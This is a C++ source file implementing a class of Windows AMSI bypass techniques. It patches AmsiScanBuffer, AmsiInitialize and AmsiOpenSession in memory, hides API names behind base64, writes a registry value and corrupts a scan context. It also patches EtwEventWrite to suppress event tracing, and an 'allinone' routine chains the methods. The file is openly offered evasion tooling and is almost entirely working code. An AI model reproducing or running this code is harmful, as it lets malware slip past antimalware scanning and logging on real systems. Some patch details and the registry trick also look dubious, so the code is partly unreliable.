// pretty shitty bypasses

#include "amsi.h"
#include <random>
#include <vector>
#include <string>

#pragma comment(lib, "amsi.lib")

amsibypass::amsibypass() {
    hamsi = LoadLibraryA("amsi.dll");
    hntdll = GetModuleHandleA("ntdll.dll");
}

amsibypass::~amsibypass() {
    if (hamsi) FreeLibrary(hamsi);
}

std::string amsibypass::base64decode(const std::string& encoded) {
    static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string decoded;
    int i = 0, j = 0, in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];

    while (in_ < encoded.size() && encoded[in_] != '=' &&
        (isalnum(encoded[in_]) || encoded[in_] == '+' || encoded[in_] == '/')) {
        char_array_4[i++] = encoded[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++) char_array_4[i] = base64_chars.find(char_array_4[i]);
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            for (i = 0; i < 3; i++) decoded += char_array_3[i];
            i = 0;
        }
    }
    return decoded;
}

bool amsibypass::patchamsiscanbuffer() {
    FARPROC scanaddr = GetProcAddress(hamsi, "AmsiScanBuffer");
    if (!scanaddr) return false;
    DWORD oldprotect;
    VirtualProtect(scanaddr, 8, PAGE_EXECUTE_READWRITE, &oldprotect);
#ifdef _WIN64
    uint8_t patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
#else
    uint8_t patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
#endif
    memcpy(scanaddr, patch, sizeof(patch));
    VirtualProtect(scanaddr, 8, oldprotect, &oldprotect);
    FlushInstructionCache(GetCurrentProcess(), scanaddr, 8);
    return true;
}

bool amsibypass::patchamsiinit() {
    FARPROC initaddr = GetProcAddress(hamsi, "AmsiInitialize");
    if (!initaddr) return false;
    DWORD oldprotect;
    VirtualProtect(initaddr, 5, PAGE_EXECUTE_READWRITE, &oldprotect);
    uint8_t patch[] = { 0x31, 0xC0, 0xC3 };
    memcpy(initaddr, patch, sizeof(patch));
    VirtualProtect(initaddr, 5, oldprotect, &oldprotect);
    return true;
}

bool amsibypass::memorypatch() {
    FARPROC scanaddr = GetProcAddress(hamsi, "AmsiScanBuffer");
    if (!scanaddr) return false;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    DWORD oldprotect;
    VirtualProtect(scanaddr, 32, PAGE_EXECUTE_READWRITE, &oldprotect);
    for (int i = 0; i < 16; i++) {
        ((uint8_t*)scanaddr)[i] = dis(gen);
    }
#ifdef _WIN64
    uint8_t finalpatch[] = { 0x48, 0xB8, 0x57, 0x00, 0x07, 0x80, 0x00, 0x00, 0x00, 0x00, 0xC3 };
#else
    uint8_t finalpatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
#endif
    memcpy(scanaddr, finalpatch, sizeof(finalpatch));
    VirtualProtect(scanaddr, 32, oldprotect, &oldprotect);
    return true;
}

bool amsibypass::hookamsiopensession() {
    FARPROC openaddr = GetProcAddress(hamsi, "AmsiOpenSession");
    if (!openaddr) return false;
    DWORD oldprotect;
    VirtualProtect(openaddr, 8, PAGE_EXECUTE_READWRITE, &oldprotect);
    uint8_t patch[] = { 0x31, 0xC0, 0xC3 };
    memcpy(openaddr, patch, sizeof(patch));
    VirtualProtect(openaddr, 8, oldprotect, &oldprotect);
    return true;
}

bool amsibypass::disableregistry() {
    HKEY hkey;
    LSTATUS status = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\AMSI", 0, KEY_SET_VALUE, &hkey);
    if (status == ERROR_SUCCESS) {
        DWORD value = 0;
        RegSetValueExA(hkey, "AllowAMSI", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hkey);
        return true;
    }
    return false;
}

bool amsibypass::patchetw() {
    FARPROC etwaddr = GetProcAddress(hntdll, "EtwEventWrite");
    if (!etwaddr) return false;
    DWORD oldprotect;
    VirtualProtect(etwaddr, 4, PAGE_EXECUTE_READWRITE, &oldprotect);
#ifdef _WIN64
    uint8_t patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
#else
    uint8_t patch[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
#endif
    memcpy(etwaddr, patch, sizeof(patch));
    VirtualProtect(etwaddr, 4, oldprotect, &oldprotect);
    return true;
}

bool amsibypass::dynamicamsi() {
    HMODULE hamsi = LoadLibraryA(base64decode("YW1zaS5kbGw=").c_str());
    if (!hamsi) return false;
    FARPROC amsiscanbuffer = (FARPROC)GetProcAddress(hamsi, base64decode("QW1zaVNjYW5CdWZmZXI=").c_str());
    if (!amsiscanbuffer) return false;
    DWORD oldprotect;
    VirtualProtect(amsiscanbuffer, 8, PAGE_EXECUTE_READWRITE, &oldprotect);
#ifdef _WIN64
    uint8_t patch[] = { 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90 };
#else
    uint8_t patch[] = { 0xC2, 0x18, 0x00, 0x90, 0x90, 0x90 };
#endif
    memcpy(amsiscanbuffer, patch, sizeof(patch));
    VirtualProtect(amsiscanbuffer, 8, oldprotect, &oldprotect);
    return true;
}

bool amsibypass::corruptamsicontext() {
    FARPROC scanaddr = GetProcAddress(hamsi, "AmsiScanBuffer");
    if (!scanaddr) return false;
    HAMSICONTEXT amsicontext;
    HAMSISESSION amsisession;
    AmsiInitialize(L"ForIAmTheHonoredOne", &amsicontext);
    AmsiOpenSession(amsicontext, &amsisession);
    AMSI_RESULT result;
    AmsiScanBuffer(amsicontext, nullptr, 0, nullptr, amsisession, &result);
    AmsiScanBuffer(amsicontext, (PVOID)0x1, 0xFFFFFFFF, nullptr, amsisession, &result);
    AmsiCloseSession(amsicontext, amsisession);
    AmsiUninitialize(amsicontext);
    return true;
}

bool amsibypass::threadbypass() {
    HANDLE hthread = CreateThread(nullptr, 0, [](LPVOID) -> DWORD {
        HMODULE hamsi = LoadLibraryA("amsi.dll");
        if (hamsi) {
            FARPROC addr = GetProcAddress(hamsi, "AmsiScanBuffer");
            if (addr) {
                DWORD old;
                VirtualProtect(addr, 8, PAGE_EXECUTE_READWRITE, &old);
#ifdef _WIN64
                memset(addr, 0xC3, 1);
#else
                memset(addr, 0xC2, 1);
                ((BYTE*)addr)[1] = 0x18;
                ((BYTE*)addr)[2] = 0x00;
#endif
                VirtualProtect(addr, 8, old, &old);
            }
        }
        return 0;
        }, nullptr, 0, nullptr);

    if (hthread) {
        WaitForSingleObject(hthread, INFINITE);
        CloseHandle(hthread);
        return true;
    }
    return false;
}

bool amsibypass::allinone() {
    bool success = false;
    if (patchamsiscanbuffer()) success = true;
    else if (memorypatch()) success = true;
    else if (hookamsiopensession()) success = true;
    else if (dynamicamsi()) success = true;
    patchetw();
    return success;
}